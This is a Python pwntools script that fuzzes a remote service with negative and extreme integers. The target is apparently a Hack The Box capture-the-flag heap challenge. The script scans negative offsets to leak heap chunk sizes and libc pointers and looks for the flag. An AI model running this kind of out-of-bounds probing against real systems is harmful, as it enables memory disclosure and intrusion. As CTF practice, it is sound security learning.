#!/usr/bin/env python3
"""
Systematic test of negative number inputs in all fields
Check if negative numbers are handled in unexpected ways
"""
from pwn import *

context.log_level = 'info'

REMOTE_HOST = '154.57.164.75'
REMOTE_PORT = 30444

def test_negative_menu():
    """Test negative menu choices"""
    print("\n" + "="*60)
    print("TEST 1: NEGATIVE MENU CHOICES")
    print("="*60)

    negative_choices = [-1, -100, -1000, -2147483648]

    for choice in negative_choices:
        try:
            io = remote(REMOTE_HOST, REMOTE_PORT, timeout=5)
            io.sendlineafter(b'> ', str(choice).encode())

            # See what happens
            response = io.recv(timeout=2)
            print(f"Menu choice {choice}: {response[:100]}")

            io.close()
        except Exception as e:
            print(f"Menu choice {choice}: Error - {e}")

def test_negative_bead_count():
    """Test negative bead count in weave_cord"""
    print("\n" + "="*60)
    print("TEST 2: NEGATIVE BEAD COUNT (weave_cord)")
    print("="*60)

    negative_counts = [-1, -2, -10, -100, -1000, -2147483648]

    for count in negative_counts:
        try:
            io = remote(REMOTE_HOST, REMOTE_PORT, timeout=5)
            io.sendlineafter(b'> ', b'1')
            io.sendlineafter(b'string: ', str(count).encode())

            # See what happens
            response = io.recv(timeout=2)
            print(f"Bead count {count}: Got {len(response)} bytes")

            # Check if allocation happened
            if b'cord is strung' in response:
                print(f"  ⚠️  Allocated with negative count {count}!")

            io.close()
        except Exception as e:
            print(f"Bead count {count}: Error - {e}")

def test_negative_tie_count():
    """Test negative how many beads to tie"""
    print("\n" + "="*60)
    print("TEST 3: NEGATIVE TIE COUNT (tie_beads)")
    print("="*60)

    negative_counts = [-1, -2, -10, -100]

    for count in negative_counts:
        try:
            io = remote(REMOTE_HOST, REMOTE_PORT, timeout=5)

            # Setup: weave cord first
            io.sendlineafter(b'> ', b'1')
            io.sendlineafter(b'string: ', b'100')

            # Try negative tie count
            io.sendlineafter(b'> ', b'2')
            io.sendlineafter(b'tie? ', str(count).encode())

            response = io.recv(timeout=2)
            print(f"Tie count {count}: {response[:100]}")

            io.close()
        except Exception as e:
            print(f"Tie count {count}: Error - {e}")

def test_negative_retie_offset():
    """Test negative offsets for retie_bead"""
    print("\n" + "="*60)
    print("TEST 4: NEGATIVE RETIE OFFSETS")
    print("="*60)

    # Already tested -1, but test more negative values
    negative_offsets = [-2, -3, -10, -100]

    for offset in negative_offsets:
        try:
            io = remote(REMOTE_HOST, REMOTE_PORT, timeout=5)

            # Setup
            io.sendlineafter(b'> ', b'1')
            io.sendlineafter(b'string: ', b'100')
            io.sendlineafter(b'> ', b'2')
            io.sendlineafter(b'tie? ', b'1')
            io.sendlineafter(b'glyphs): ', b'TESTTEST')

            # Try negative retie offset
            io.sendlineafter(b'> ', b'3')
            io.sendlineafter(b'retie? ', str(offset).encode())

            response = io.recv(timeout=2)
            print(f"Retie offset {offset}: {response[:100]}")

            if b'mantra for bead' in response:
                # It asked for the mantra, so the offset was accepted
                io.sendline(b'RETIEDXX')
                print(f"  ⚠️  Offset {offset} was accepted!")

            io.close()
        except Exception as e:
            print(f"Retie offset {offset}: Error - {e}")

def test_negative_recite_offset():
    """Test negative offsets for recite_bead"""
    print("\n" + "="*60)
    print("TEST 5: NEGATIVE RECITE OFFSETS (systematic)")
    print("="*60)

    # Systematically test negative offsets to map what's accessible
    for offset in range(-1, -50, -1):
        try:
            io = remote(REMOTE_HOST, REMOTE_PORT, timeout=5)

            # Setup
            io.sendlineafter(b'> ', b'1')
            io.sendlineafter(b'string: ', b'100')
            io.sendlineafter(b'> ', b'2')
            io.sendlineafter(b'tie? ', b'1')
            io.sendlineafter(b'glyphs): ', b'TESTTEST')

            # Try negative recite offset
            io.sendlineafter(b'> ', b'4')
            io.sendlineafter(b'recite? ', str(offset).encode())

            io.recvuntil(b'speaks: [')
            data = io.recvuntil(b']', drop=True)

            if len(data) == 8:
                val = int.from_bytes(data, 'little')
                if val != 0:
                    print(f"  ⚠️  Non-zero at offset {offset}: 0x{val:016x}")
                else:
                    print(f"  Offset {offset}: zeros")
            elif b'HTB{' in data or b'flag' in data.lower():
                print(f"  🎉 FLAG at offset {offset}: {data}")
            else:
                print(f"  Offset {offset}: {data}")

            io.close()

        except Exception as e:
            print(f"  Offset {offset}: Error - {e}")
            # Continue to see if other offsets work

def test_max_negative_values():
    """Test maximum negative values (int64_t limits)"""
    print("\n" + "="*60)
    print("TEST 6: MAXIMUM NEGATIVE VALUES")
    print("="*60)

    max_negatives = [
        (-1, "-1"),
        (-128, "i8 min"),
        (-32768, "i16 min"),
        (-2147483648, "i32 min"),
        (-9223372036854775808, "i64 min"),
    ]

    for value, desc in max_negatives:
        try:
            io = remote(REMOTE_HOST, REMOTE_PORT, timeout=5)

            # Try as recite offset
            io.sendlineafter(b'> ', b'1')
            io.sendlineafter(b'string: ', b'100')
            io.sendlineafter(b'> ', b'2')
            io.sendlineafter(b'tie? ', b'1')
            io.sendlineafter(b'glyphs): ', b'TESTTEST')

            io.sendlineafter(b'> ', b'4')
            io.sendlineafter(b'recite? ', str(value).encode())

            io.recvuntil(b'speaks: [')
            data = io.recvuntil(b']', drop=True)

            # Decode what we got
            if len(data) == 8:
                val = int.from_bytes(data, 'little')
                desc_str = f"0x{val:016x}"
                if val == 0x0000000000000331:
                    desc_str += " (chunk size)"
                elif val >> 40 == 0x7f:
                    desc_str += " (possible libc)"
            else:
                desc_str = data.decode('latin-1', errors='ignore')

            print(f"{desc:12s} ({value:20d}): {desc_str}")

            io.close()
        except Exception as e:
            print(f"{desc:12s} ({value:20d}): Error - {e}")

def test_negative_after_positive():
    """Test what happens if we read positive then negative"""
    print("\n" + "="*60)
    print("TEST 7: MIXED POSITIVE/NEGATIVE OPERATIONS")
    print("="*60)

    try:
        io = remote(REMOTE_HOST, REMOTE_PORT, timeout=5)

        # Setup
        io.sendlineafter(b'> ', b'1')
        io.sendlineafter(b'string: ', b'100')
        io.sendlineafter(b'> ', b'2')
        io.sendlineafter(b'tie? ', b'1')
        io.sendlineafter(b'glyphs): ', b'TESTTEST')

        # Read at positive offset
        io.sendlineafter(b'> ', b'4')
        io.sendlineafter(b'recite? ', b'0')
        io.recvuntil(b'speaks: [')
        data1 = io.recvuntil(b']', drop=True)
        print(f"Read offset 0: {data1}")

        # Try reading at negative offset (should be blocked)
        io.sendlineafter(b'> ', b'4')
        io.sendlineafter(b'recite? ', b'-1')
        try:
            io.recvuntil(b'speaks: [', timeout=2)
            data2 = io.recvuntil(b']', drop=True)
            print(f"⚠️  Second read succeeded! Data: {data2}")
        except:
            print("✓ Second read correctly blocked")

        io.close()
    except Exception as e:
        print(f"Error: {e}")

def main():
    print("\n" + "="*60)
    print("COMPREHENSIVE NEGATIVE INPUT TESTING")
    print(f"Testing against: {REMOTE_HOST}:{REMOTE_PORT}")
    print("="*60)

    test_negative_menu()
    test_negative_bead_count()
    test_negative_tie_count()
    test_negative_retie_offset()
    test_negative_recite_offset()
    test_max_negative_values()
    test_negative_after_positive()

    print("\n" + "="*60)
    print("Negative input testing complete!")
    print("="*60)

if __name__ == '__main__':
    main()
